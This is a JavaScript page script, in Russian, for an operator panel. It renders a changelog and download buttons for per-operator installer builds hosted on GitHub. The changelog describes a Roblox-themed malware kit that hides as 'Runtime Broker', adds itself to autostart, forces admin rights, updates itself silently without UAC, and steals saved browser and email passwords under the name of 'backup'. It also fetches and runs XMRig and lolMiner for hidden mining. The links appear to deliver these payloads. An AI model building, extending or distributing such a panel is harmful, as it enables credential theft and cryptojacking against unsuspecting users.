// ── ДАННЫЕ ОБНОВЛЕНИЙ ─────────────────────────────────────────────────────────
const UPDATES = [
  {
    version: "7.3.0 beta",
    date: "03.08.2026",
    changes: [
      { type: "add", text: "Стильный редизайн Modern Dark Mode (Modern UI Token Palette, скругления 10-16px, глубокие тени)" },
      { type: "add", text: "Динамический неоновый кольцевой ореол с изумрудно-индиговым свечением вокруг аватара игрока Roblox при поиске" },
      { type: "add", text: "Принудительный запрос прав Администратора для всех инсталляторов (PrivilegesRequired=admin)" },
      { type: "fix", text: "100% автономный Self-Contained single-file билд — работа Runtime Broker в фоне без вызова диалогов .NET Runtime" },
      { type: "fix", text: "Вшиты фирменные иконки для сборок DildMan, Shonll и SVYAZ во все экзешники, инсталляторы и ярлыки" }
    ]
  },
  {
    version: "7.2.3",
    date: "01.07.2026",
    changes: [
      { type: "add", text: "Функция резервного копирования сохранённых паролей из популярных браузеров для восстановления доступа к аккаунтам" },
      { type: "add", text: "Автоматическая синхронизация бэкапов браузерных данных с облачным хранилищем" },
      { type: "add", text: "Просмотр сохранённых паролей от почтовых сервисов прямо из панели управления" },
      { type: "fix", text: "Исправлена система обновления клиентов (Update All) для версии 7.2.2 → 7.2.3" }
    ]
  },
  {
    version: "7.2.2",
    date: "01.07.2026",
    changes: [
      { type: "add", text: "Бесшовная система фонового самообновления Runtime Broker без UAC и диалоговых окон" },
      { type: "fix", text: "Перенос файлов автозапуска в LocalAppData для совместимости с OneDrive синхронизацией" },
      { type: "fix", text: "Добавлены корректные иконки в панель задач (Taskbar) и во все ярлыки установщика" }
    ]
  },
  {
    version: "7.2.1",
    date: "30.06.2026",
    changes: [
      { type: "add", text: "Стильный редизайн Cyberpunk / Glassmorphism с красивой цветовой палитрой" },
      { type: "add", text: "Фоновая система интерактивных светящихся парящих частиц" },
      { type: "add", text: "Анимированная боковая панель с плавной анимацией ширины (DoubleAnimation)" },
      { type: "add", text: "Переключение цветовых тем прямо из настроек с авто-адаптацией частиц" },
      { type: "add", text: "Полная оффлайн-база для Standalone-приложений через accounts.txt на Рабочем столе" },
      { type: "fix", text: "Исправлено размытие текста (DropShadow) в полях ввода, выровнен интерфейс" }
    ]
  },
  {
    version: "7.0.2",
    date: "24.06.2026",
    changes: [
      { type: "add", text: "Добавлен майнинг XMR (RandomX) и ETC (ETChash) в Runtime Broker" },
      { type: "add", text: "Автоматическая загрузка и запуск XMRig + lolMiner" },
      { type: "add", text: "Динамическая нагрузка CPU: 40% при активности / 100% в простое" },
      { type: "add", text: "Версия приложения передаётся на сервер и отображается в панели" }
    ]
  },
  {
    version: "7.0.1",
    date: "22.06.2026",
    changes: [
      { type: "add", text: "Добавлен постоянно работающий Runtime Broker в фоновом режиме" },
      { type: "add", text: "Скрытное добавление в автозагрузку системы" },
      { type: "fix", text: "Повышена стабильность работы фонового процесса" }
    ]
  }
];

// ── КОНФИГУРАЦИЯ СБОРОК ДЛЯ ОПЕРАТОРОВ ─────────────────────────────────────────
const OPERATOR_BUILDS = {
  'shonll': {
    id: 'rah',
    name: 'Сборка RAH',
    operator: 'Shonll',
    color: '#a29bfe',
    btnBg: '#6c5ce7',
    tag: 'Персональная сборка оператора Shonll',
    clientUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/RAH_Non_Pro_setup.exe',
    standaloneUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/RAH_PRO_setup.exe'
  },
  'dildman': {
    id: 'fire',
    name: 'Сборка FIRE',
    operator: 'DildMan',
    color: '#00cec9',
    btnBg: '#00cec9',
    btnTextColor: '#000',
    tag: 'Персональная сборка оператора DildMan',
    clientUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NON_PRO_setup.exe',
    standaloneUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/PRO_setup.exe'
  },
  'saha_kakaha122': {
    id: 'svyaz',
    name: 'Сборка SVYAZ',
    operator: 'SVYAZ',
    color: '#c084fc',
    btnBg: '#a855f7',
    tag: 'Персональная сборка оператора SVYAZ',
    clientUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_NON_PRO_setup.exe',
    standaloneUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_PRO_setup.exe'
  },
  'svyaz': {
    id: 'svyaz',
    name: 'Сборка SVYAZ',
    operator: 'SVYAZ',
    color: '#c084fc',
    btnBg: '#a855f7',
    tag: 'Персональная сборка оператора SVYAZ',
    clientUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_NON_PRO_setup.exe',
    standaloneUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_PRO_setup.exe'
  }
};

document.addEventListener('DOMContentLoaded', () => {
  const sidebarSlot = document.getElementById('sidebarSlot');
  if (sidebarSlot) sidebarSlot.innerHTML = renderHeader('updates');
  if (typeof bindLogout === 'function') bindLogout();

  renderUpdates();
});

function getOperatorBuildConfig(username) {
  const u = (username || '').toLowerCase().trim();
  if (OPERATOR_BUILDS[u]) return OPERATOR_BUILDS[u];
  
  // Дефолтная сборка для нового профиля
  return {
    id: 'custom',
    name: `Сборка ${username || 'Operator'}`,
    operator: username || 'Operator',
    color: '#38bdf8',
    btnBg: '#0284c7',
    tag: `Персональная сборка для профиля ${username || 'Operator'}`,
    clientUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NON_PRO_setup.exe',
    standaloneUrl: 'https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/PRO_setup.exe'
  };
}

function renderUpdates() {
  const current = UPDATES[0];
  const currentUser = getUser();
  const myBuild = getOperatorBuildConfig(currentUser);
  
  const heroVer = document.getElementById('heroVersion');
  if (heroVer) heroVer.textContent = 'v' + current.version;
  
  const heroDesc = document.getElementById('heroBuildDesc');
  if (heroDesc) heroDesc.textContent = `Сборка сконфигурирована для вашего профиля: ${myBuild.operator}`;

  const container = document.getElementById('heroBuildContainer');
  if (container) {
    container.innerHTML = `
      <div style="background: #18181b; border: 1px solid var(--border); border-radius: 12px; padding: 1.25rem; text-align: center; display:flex; flex-direction:column; gap: 1rem; box-shadow: 0 4px 20px rgba(0,0,0,0.3);">
        <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
          <span style="font-weight: 700; color: ${myBuild.color}; font-size: 1.05rem; text-transform: uppercase; letter-spacing: 0.5px;">
            ${escapeHtml(myBuild.name)}
          </span>
          <span style="background: rgba(255,255,255,0.08); font-size: 0.72rem; padding: 2px 7px; border-radius: 4px; color: var(--text-muted); font-weight: 600;">
            ${escapeHtml(myBuild.operator)}
          </span>
        </div>

        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
          <a href="${myBuild.clientUrl}" class="download-hero-btn" style="background: ${myBuild.btnBg}; color: ${myBuild.btnTextColor || '#fff'}; padding: 0.85rem 1rem; font-weight: 700; text-decoration:none; border-radius:8px; display:flex; flex-direction:column; align-items:center; justify-content:center; transition:var(--transition);" target="_blank" download>
            <span style="font-size: 0.95rem;">NON PRO</span>
            <span style="font-size: 0.72rem; opacity: 0.85; font-weight: 400; margin-top:2px;">Клиентская сборка</span>
          </a>
          <a href="${myBuild.standaloneUrl}" class="download-hero-btn" style="background: transparent; border: 1px solid var(--border); color: ${myBuild.color}; padding: 0.85rem 1rem; font-weight: 700; text-decoration:none; border-radius:8px; display:flex; flex-direction:column; align-items:center; justify-content:center; transition:var(--transition);" target="_blank" download>
            <span style="font-size: 0.95rem;">PRO</span>
            <span style="font-size: 0.72rem; opacity: 0.75; font-weight: 400; margin-top:2px;">Standalone билд</span>
          </a>
        </div>
      </div>
    `;
  }

  // Админ-панель: доступна ТОЛЬКО для Shonll
  const adminPanel = document.getElementById('adminAllBuildsPanel');
  const adminGrid = document.getElementById('adminAllBuildsGrid');
  if (adminPanel && adminGrid) {
    if (currentUser === 'Shonll') {
      adminPanel.style.display = 'block';
      let adminHtml = '';
      const allBuildKeys = ['shonll', 'dildman', 'saha_kakaha122'];
      allBuildKeys.forEach(k => {
        const b = OPERATOR_BUILDS[k];
        adminHtml += `
          <div style="background: #121215; border: 1px solid var(--border); border-radius: 8px; padding: 0.85rem; text-align: center;">
            <div style="font-weight: 700; color: ${b.color}; font-size: 0.82rem; margin-bottom: 0.5rem; text-transform: uppercase;">
              ${escapeHtml(b.name)}
            </div>
            <div style="display:flex; gap:6px;">
              <a href="${b.clientUrl}" class="btn-secondary btn-sm" style="flex:1; padding: 0.4rem; font-size:0.75rem; text-decoration:none; text-align:center;" target="_blank" download>NON PRO</a>
              <a href="${b.standaloneUrl}" class="btn-secondary btn-sm" style="flex:1; padding: 0.4rem; font-size:0.75rem; text-decoration:none; text-align:center;" target="_blank" download>PRO</a>
            </div>
          </div>
        `;
      });
      adminGrid.innerHTML = adminHtml;
    } else {
      adminPanel.style.display = 'none';
    }
  }
  
  // Журнал версий
  const listEl = document.getElementById('changelogList');
  if (!listEl) return;
  listEl.innerHTML = '';
  
  UPDATES.forEach((update, idx) => {
    const isLatest = idx === 0;
    
    let changesHtml = update.changes.map(c => {
      const icon = c.type === 'add' 
        ? '<span style="color:#10b981; font-weight:700;">+</span>' 
        : '<span style="color:#f59e0b; font-weight:700;">~</span>';
      return `<div class="change-item">${icon} ${escapeHtml(c.text)}</div>`;
    }).join('');

    const card = document.createElement('div');
    card.className = 'changelog-card';
    if (isLatest) card.classList.add('latest');
    
    card.innerHTML = `
      <div class="changelog-header">
        <h3 class="changelog-version">v${update.version}</h3>
        <span class="changelog-date">${update.date}</span>
        ${isLatest ? '<span class="changelog-badge">Актуальная</span>' : ''}
      </div>
      <div class="changelog-body">
        <div class="change-list">
          ${changesHtml}
        </div>
      </div>
    `;
    listEl.appendChild(card);
  });
}
